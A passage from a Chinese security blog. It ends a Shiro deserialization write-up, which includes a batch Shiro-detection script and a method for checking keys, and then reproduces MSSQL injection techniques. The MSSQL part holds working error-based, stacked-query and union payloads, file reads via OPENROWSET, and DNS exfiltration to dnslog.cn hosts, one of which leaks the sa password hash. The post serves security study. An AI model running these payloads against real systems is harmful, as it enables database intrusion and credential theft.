<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><h4 id="如何识别shiro"><a href="#如何识别shiro" class="headerlink" title="如何识别shiro?"></a><strong>如何识别shiro?</strong></h4><p>​        要检测一个shiro是否存在反序列化漏洞，首先需要对shiro这个框架做一个识别，目前大部分的方法都是通过rememberMe=deleteMe;来识别的，但是并不是我们请求的所有地址都会返回rememberMe=deleteMe,但是在实战中我们可能需要批量去检测shiro框架，我们该如何识别？</p>
<p>​        通过之前的分析我们知道，无论我们访问哪个url，都会经过shiro的拦截器，而在shiro的拦截器中会获取cookie中rememberMe的内容并进行解密，并且通过之前的分析，我们知道解密是由convertBytesToPrincipals（）完成的，如果我们传入的rememberMe不能正常的反序列化，就会抛出异常，调用onRememberedPrincipalFailure方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170537270.png" alt="image-20201201170537270"></p>
<p>​    该方法经过几层调用最终调用了this.getCookie().removeFrom(request, response);方法</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170614952.png" alt="image-20201201170614952"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170630060.png" alt="image-20201201170630060"></p>
<p><strong><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170639745.png" alt="image-20201201170639745"></strong></p>
<p>​    在removeFrom中，会在返回包header加上rememberMe=deleteMe，因此无论我们访问任何使用了shiro框架的路由，只需要在请求头中的cookie中加入rememberMe=xxx，如果目标使用了shiro，则会返回rememberMe=deleteMe，也就是说我们可以通过一个包来识别是否使用了shiro框架。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170725328.png" alt="image-20201201170725328"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170959832.png" alt="image-20201201170959832"></p>
<p>​    了解了这些，我们可以写一个简单的python脚本来批量识别shiro，这里注意我将重定向设置为false，否则我们在请求时会跟进302跳转，但跳转后的结果里可能没有rememberMe=deleteMe。<br><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180626070.png" alt="image-20201201180626070"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180604356.png" alt="image-20201201180604356"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def shiroScan(url):</span><br><span class="line"></span><br><span class="line">    header&#x3D;&#123;</span><br><span class="line">        &#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36&#39;,</span><br><span class="line">        &#39;Accept&#39;:&#39;image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,image&#x2F;*,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">        &#39;Accept-Encoding&#39;:&#39;gzip, deflate&#39;,</span><br><span class="line">        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q&#x3D;0.9&#39;,</span><br><span class="line">        &#39;Cookie&#39;:&#39;rememberMe&#x3D;1&#39;,</span><br><span class="line">        &#39;Connection&#39;:&#39;close&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    proxies &#x3D; &#123; &quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8088&quot;, &quot;https&quot;: &quot;https:&#x2F;&#x2F;127.0.0.1:8088&quot;&#125;</span><br><span class="line">    resp&#x3D;requests.get(url&#x3D;url,headers&#x3D;header,proxies&#x3D;proxies,verify&#x3D;False,allow_redirects&#x3D;False)</span><br><span class="line">    for name, regex in resp.headers.items():</span><br><span class="line">        if &quot;rememberMe&#x3D;deleteMe&quot; in regex:</span><br><span class="line">            print(url+ &quot; is Shiro!!!&quot;)</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    with open(&#39;domain.txt&#39;,&#39;r&#39;) as f:</span><br><span class="line">        lines&#x3D;f.readlines()</span><br><span class="line">        for i in lines:</span><br><span class="line">            domain&#x3D;i.strip(&#39;\n&#39;)</span><br><span class="line">            shiroScan(domain)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180705142.png" alt="image-20201201180705142"></p>
<h4 id="如何判断key是否正确？"><a href="#如何判断key是否正确？" class="headerlink" title="如何判断key是否正确？"></a><strong>如何判断key是否正确？</strong></h4><p>​    通过上面的测试我们知道当我们使用的加密key正确可以正常进行反序列化操作，即使key正确，但生成的内容无法正常反序列化，则还是会返回rememberMe=deleteMe，因为反序列化的操作是在convertBytesToPrincipals方法完成的，如果反序列化的过程中出现异常，还是会设置rememberMe=deleteMe这个请求头，因此我们测试key是否正确，需要找到一个可以不依赖第三方组件的java中默认存在且和jdk版本无关的类来进行反序列化。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202094802148.png" alt="image-20201202094802148"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202094838261.png" alt="image-20201202094838261"></p>
<p>​        我尝试使用URLDNS来进行判断，虽然可以正常发起DNS请求，但 由于执行过程中的类型转换错误，因此还是会返回rememberMe=deleteMe。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202100922001.png" alt="image-20201202100922001"></p>
<p>​        我们正常的登录，看看正常登录过程中的反序列化的类是什么类型</p>
<p><strong><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202104733807.png" alt="image-20201202104733807"></strong></p>
<p>​        使用这个rememberMe的内容利用，看shiro再进行反序列化的过程中反序列化的是哪个类？</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202104854538.png" alt="image-20201202104854538"></p>
<p>​        跟进后发现是反序列化了SimplePrincipalCollection类，所以我们只要创建一个SimplePrincipalCollection对应的对象进行序列化就可以了，当传入的序列化内容可以正常被解析，就不会出现rememberMe=deleteMe，因此可以通过这个特性来判断我们的key是否正确。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105111202.png" alt="image-20201202105111202"></p>
<p>​        我们查看一下ShiroExploit这个工具，看看他是怎么实现的。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105408945.png" alt="image-20201202105408945"></p>
<p>​    这个工具在检测key是否正确的过程中调用了ysoserial的ShiroCheck，可我去查看ysoserial的github项目，发现并没有这个选项，也就是这个是作者自己扩展编写的。我们反编译ShiroExploit自带的ysoserial，他的实现也非常简单，就是创建一个SimplePrincipalCollection对象。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105609290.png" alt="image-20201202105609290"></p>
<h4 id="如何检测利用链？"><a href="#如何检测利用链？" class="headerlink" title="如何检测利用链？"></a>如何检测利用链？</h4><p>​        在JAVA的反序列化漏洞中，仅仅找到readObject反序列化并不一定能造成RCE，还有一点比较重要的是需要找到利用链，这个要具体展开讲需要依赖的知识点有点多，我之后会单独写一篇文章来讲解。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于sqlserver注入另类技巧的学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-11-13 16:50:19" itemprop="dateCreated datePublished" datetime="2020-11-13T16:50:19+08:00">2020-11-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-11-19 15:20:27" itemprop="dateModified" datetime="2020-11-19T15:20:27+08:00">2020-11-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    最近看到国外一篇关于<a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/" target="_blank" rel="noopener">mssql注入利用</a>的文章，里面用了很多技巧我之前一直不知道，所以自己对这些技巧进行了复现,本次测试的环境为SQLSERVER2008</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>​    之前对于SQLSERVER报错注入理解仅限于类型转换导致的报错的利用方法，这次看到有很多新的函数可以进行报错注入利用，我把每个函数的测试单独取出来进行测试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SUSER_NAME()</span><br><span class="line">USER_NAME()</span><br><span class="line">PERMISSIONS()</span><br><span class="line">DB_NAME()</span><br><span class="line">FILE_NAME()</span><br><span class="line">TYPE_NAME()</span><br><span class="line">COL_NAME()</span><br></pre></td></tr></table></figure>

<p>​        SUSER_NAME()函数本来的作用是通过用户的id返回用户名,那id是int型的，由于我们输入的语句返回结果是varchar类型，因此会导致类型转换异常和报错，如下所示：</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113165830418.png" alt="image-20201113165830418"></p>
<p>​    我们已经可以看到报错了，但是如果想要获取更多的信息怎么办，还能通过这个函数来进行报错注入的利用吗？可以的，语句如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SUSER_NAME((select @@version))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113170131763.png" alt="image-20201113170131763"></p>
<p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SUSER_NAME((select top 1 table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113170346115.png" alt="image-20201113170346115"></p>
<p>上面是直接执行的结果，如果我们放到具体的注入语句里该怎么用？使用方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_Attitudes where id &#x3D;1 and 1&#x3D;SUSER_NAME(@@version)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172402013.png" alt="image-20201113172402013"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172434689.png" alt="image-20201113172434689"></p>
<p>​    其他函数的用法类似，所以不一一说明了，下面给出利用的截图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;USER_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;PERMISSIONS((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;DB_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;FILE_NAME((select top 1 table_name from information_schema.tables))	</span><br><span class="line">and 1&#x3D;TYPE_NAME((select top 1 table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172656283.png" alt="image-20201113172656283"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172708675.png" alt="image-20201113172708675"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172721793.png" alt="image-20201113172721793"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172733723.png" alt="image-20201113172733723"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172755049.png" alt="image-20201113172755049"></p>
<pre><code>最后一个函数COL_NAME有一点不一样，需要两个参数</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;COL_NAME((select top 1 table_name from information_schema.tables),1)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113172912410.png" alt="image-20201113172912410"></p>
<p>​    这些函数都有一个特性，就是他们输入的值都为int，返回值为varchar，我们可以利用这个特征去找其他可能导致报错注入的函数，之所以要了解这些函数，我们可以在利用报错注入某些函数被拦截的时候，通过替换为其他函数的方式来利用报错注入。</p>
<h2 id="快速获取数据的小技巧"><a href="#快速获取数据的小技巧" class="headerlink" title="快速获取数据的小技巧"></a>快速获取数据的小技巧</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>​    我个人觉得MSSQL的报错注入比较鸡肋，因为MSSQL注入点一般都会支持堆叠查询，通过报错注入获取数据的速度远不如堆叠注入获取数据的速度快，这里我给出堆叠注入快速获取数据的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX) SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM master..sysdatabases SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) SELECT CAST(@myoutput as int)  列出所有数据库</span><br><span class="line"></span><br><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX)  SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM 数据库名..sysobjects WHERE type &#x3D; &#39;U&#39; SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) SELECT CAST(@myoutput as int)  列出所有的表</span><br><span class="line"></span><br><span class="line">DECLARE @listStr VARCHAR(MAX) DECLARE @myoutput VARCHAR(MAX) SET @listStr &#x3D; &#39;&#39; SELECT @listStr &#x3D; @listStr + Name + &#39;,&#39; FROM 数据库名..syscolumns WHERE id&#x3D;object_id(&#39;表名&#39;) SELECT @myoutput &#x3D; SUBSTRING(@listStr , 1, LEN(@listStr)-1) select cast(@myoutput as int) </span><br><span class="line">列出所有的列</span><br></pre></td></tr></table></figure>

<p>获取所有数据库</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173622807.png" alt="image-20201113173622807"></p>
<p>获取所有表名</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173643045.png" alt="image-20201113173643045"></p>
<p>获取所有列名</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113173732520.png" alt="image-20201113173732520"></p>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>​    在MSSQL 2016及以后支持使用FOR JSON AUTO函数，我们可以使用这个函数结合联合查询获取数据,由于我本地的数据库版本比较低，所以复现不了这种利用方式，这里给出作者的Payload和截图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vuln.app&#x2F;getItem?id&#x3D;1&#39;+and+1&#x3D;(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113200720930.png" alt="image-20201113200720930"></p>
<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>​    还是由于环境的问题，无法复现这种利用方式，给出作者的payload和截图</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vuln.app&#x2F;getItem?id&#x3D;1&#39;+and+1&#x3D;(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201113201003499.png" alt="image-20201113201003499"></p>
<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a><strong>文件读取</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT BulkColumn FROM OPENROWSET(BULK N&#39;C:\Windows\win.ini&#39;, SINGLE_BLOB) as document</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119114708244.png" alt="image-20201119114708244"></p>
<p>​    我尝试在报错注入中用到这种方法，但是并没有成功利用，但是可以在union联合查询中利用该方法读取文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AtUsers where id&#x3D;-1 union select  null,(SELECT BulkColumn FROM OPENROWSET(BULK N&#39;C:\Windows\win.ini&#39;, SINGLE_BLOB) as document),null,null</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115448908.png" alt="image-20201119115448908"></p>
<h2 id="获取当前正在执行的语句"><a href="#获取当前正在执行的语句" class="headerlink" title="获取当前正在执行的语句"></a>获取当前正在执行的语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115716185.png" alt="image-20201119115716185"></p>
<p>​    这种语句在报错注入中仍然是有效的</p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119115821821.png" alt="image-20201119115821821"></p>
<h2 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h2><p>​    通过fn_xe_file_target_read_file加载UNC路径请求DNS,虽然这个函数第一个和第二个参数都是文件路径，但实际上会先去请求第一个参数对应的路径，所以一般情况下最好用第一个参数加载执行，当我们多次请求同一个UNC路径，只会执行第一次，所以每次执行完后，最好将前面的路径稍微改一下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_xe_file_target_read_file(&#39;\\1a.idbfh8.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133707689.png" alt="image-20201119133707689"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133712427.png" alt="image-20201119133712427"></p>
<p>​    在什么情况下可以用fn_xe_file_target_read_file的第二个参数进行利用呢，答案是当第一个参数指定的路径存在的情况下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_xe_file_target_read_file(&#39;c:\windows\win.ini&#39;,&#39;\\jtf50t.dnslog.cn\1.xem&#39;,null,null)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133934287.png" alt="image-20201119133934287"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119133951324.png" alt="image-20201119133951324"></p>
<p>​    我测试了报错注入和UNION下利用这种方式外带数据，都是不行的，但在where后添加EXISTS函数执行是可以的,这里有一个小坑，<strong>就是and前面的参数的内容必须是存在的，才会执行DNS请求，否则不会执行成功。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AuditItems where DisplayOrder&#x3D;121 and exists(select * from fn_xe_file_target_read_file(&#39;\\1a.myg9zc.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119141927943.png" alt="image-20201119141927943"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119141953818.png" alt="image-20201119141953818"></p>
<p>​    还有一个问题是我们如果想要利用这种方式外带数据，该怎么利用，这个语句因为出现了+号，所以在get提交时需要注意URL编码的问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tn_AuditItems where DisplayOrder&#x3D;121 and exists(select * from fn_xe_file_target_read_file(&#39;\\&#39;+(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name&#x3D;&#39;sa&#39;)+&#39;.myg9zc.dnslog.cn\1.xem&#39;,&#39;1.xem&#39;,null,null))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142531471.png" alt="image-20201119142531471"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142548412.png" alt="image-20201119142548412"></p>
<p>​        和fn_xe_file_target_read_file类似的函数还有fn_get_audit_file，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from fn_get_audit_file(&#39;\\zwbqeg.dnslog.cn\11.xxx&#39;,default,default)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142900030.png" alt="image-20201119142900030"></p>
<p><img src="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20201119142908659.png" alt="image-20201119142908659"></p>
<p>​    作者还提供了fn_trace_gettable函数，不过这种利用方式我并没有复现成功。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    对于该作者挖掘到这些关于注入利用的函数，我们肯定也在想他是如何找到这些函数的，这里我大致做一下分析。</p>
<p><strong>报错注入函数</strong></p>
<p>​    我查阅了一些资料，这些函数都有一些共同点，就是接收的参数是int型的参数，并且返回值是varchar类型，如果我们想要挖掘其他的可以报错的函数，可以寻找这种类型的函数。</p>
<p><strong>DNS注入函数</strong></p>
